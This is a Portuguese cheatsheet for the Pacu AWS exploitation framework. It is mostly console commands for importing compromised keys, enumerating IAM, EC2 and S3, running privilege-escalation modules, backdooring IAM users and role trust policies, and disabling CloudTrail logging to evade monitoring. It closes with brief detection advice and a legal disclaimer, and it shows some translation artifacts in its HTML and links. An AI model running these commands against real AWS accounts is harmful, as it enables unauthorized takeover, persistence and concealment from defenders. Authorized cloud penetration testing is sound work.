<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ Pacu - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Segurança na nuvem">
</p>

<p alinhar="centro">
  <b>☁️ A estrutura de exploração de código aberto da AWS projetada para testes de penetração em ambientes de nuvem, escalonamento de privilégios, coleta de credenciais e reconhecimento de infraestrutura</b>
</p>

---

## 📋 Índice

- [Visão geral e arquitetura](#-visão geral--arquitetura)
- [Instalação](#-instalação)
- [Gerenciamento de sessões e importação de chave AWS](#-session-management--aws-key-import)
  - [Importando credenciais comprometidas](#importing-compromised-credentials)
  - [Funções assumidas e tokens de sessão](#assumed-roles-and-session-tokens)
- [Módulos de reconhecimento e enumeração](#-reconhecimento--módulos de enumeração)
  - [Enumerando permissões atuais do IAM](#enumerating-current-iam-permissions)
  - [Verificação de instâncias EC2 e buckets S3](#scanning-ec2-instances--s3-buckets)
- [Técnicas de escalonamento de privilégios na AWS](#-privilege-escalation-techniques-in-aws)
  - [Scanner automático de escalonamento de privilégios](#scanner automático de escalonamento de privilégios)
  - [Executando Módulos de Escalação](#executing-escalation-modules)
- [Persistência e Evasão de Defesa](#-persistência--evasão de defesa)
  - [Backdooring de funções e usuários do IAM](#backdooring-iam-roles--users)
  - [Interrompendo o registro do CloudTrail](#disrupting-cloudtrail-logging)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e detecção](#-considerações defensivas--detecção)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e arquitetura

Criado pelo **Rhino Security Labs**, **Pacu** é o "Metasploit para AWS". Ele foi projetado para emular táticas adversárias em ambientes Amazon Web Services.

Pacu opera usando um banco de dados SQLite local que mantém o estado durante sessões ofensivas:
- **Pipeline Modular:** Mais de 40 módulos especializados que abrangem descoberta, movimentação lateral, escalonamento de privilégios, persistência e exfiltração.
- **Enumeração de permissões:** analisa políticas de IAM sem acionar limites de alerta, testando ações de API ou revisando políticas gerenciadas anexadas.
- **Automação Privesc:** avalia caminhos de escalonamento de permissão IAM conhecidos (como `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥 Instalação
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Gerenciamento de sessões e importação de chaves AWS

Quando o Pacu é iniciado, você entra em um console interativo. Crie ou selecione uma sessão:
```text
Pacu > set_session client_assessment
```
### Importando credenciais comprometidas
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Funções assumidas e tokens de sessão
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Módulos de Reconhecimento e Enumeração

### Enumerando permissões atuais do IAM
Determine quem você é e o que as credenciais ativas têm permissão para fazer:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Verificando instâncias EC2 e buckets S3
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Técnicas de escalonamento de privilégios na AWS

O escalonamento de privilégios da AWS depende de políticas do IAM mal configuradas que permitem que usuários não administrativos concedam direitos administrativos a si mesmos ou a outras entidades.

### Scanner automático de escalonamento de privilégios
Verifica suas permissões enumeradas em mais de 21 vetores privasc documentados da AWS:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*Exemplo de saída destaca permissões vulneráveis como `iam:PutUserPolicy`, `iam:AttachUserPolicy` ou `iam:CreateAccessKey`.*

### Executando Módulos de Escalação
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Persistência e Evasão de Defesa

### Backdooring de funções e usuários do IAM
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Interrompendo o registro do CloudTrail
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando Pacu |
|-----------|--------------|
| **Definir/selecionar sessão** | `set_session <NAME>` |
| **Importar credenciais da AWS** | `set_keys` |
| **Mostrar identidade atual** | `whoami` |
| **Enumerar direitos IAM** | `run iam__enum_permissions` |
| **Verificar vetores Privesc** | `run iam__privesc_scan` |
| **Enumerar buckets S3** | `run s3__enum` |
| **Enumerar instâncias do EC2** | `run ec2__enum` |
| **Interrupção do CloudTrail** | `run cloudtrail__disrupt_logging` |
| **Listar Módulos Disponíveis** | `list` |

---

## 🛡️ Considerações defensivas e detecção

1. **Monitoramento GuardDuty e CloudTrail:** O escalonamento automatizado de privilégios e a verificação de permissões do Pacu geram consultas rápidas e sequenciais de API facilmente sinalizadas pelo AWS GuardDuty.
2. **SCP e limites de permissão:** Aplique políticas de controle de serviços (SCPs) do AWS Organizations, evitando que qualquer principal, incluindo administradores completos, adultere o CloudTrail ou modifique estruturas organizacionais raiz.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Pacu foi projetado especificamente para testes de penetração e avaliações de segurança autorizados da AWS. Testar contas na nuvem sem permissão prévia explícita do proprietário do ativo viola a Política de Uso Aceitável da Amazon Web Services e a legislação internacional.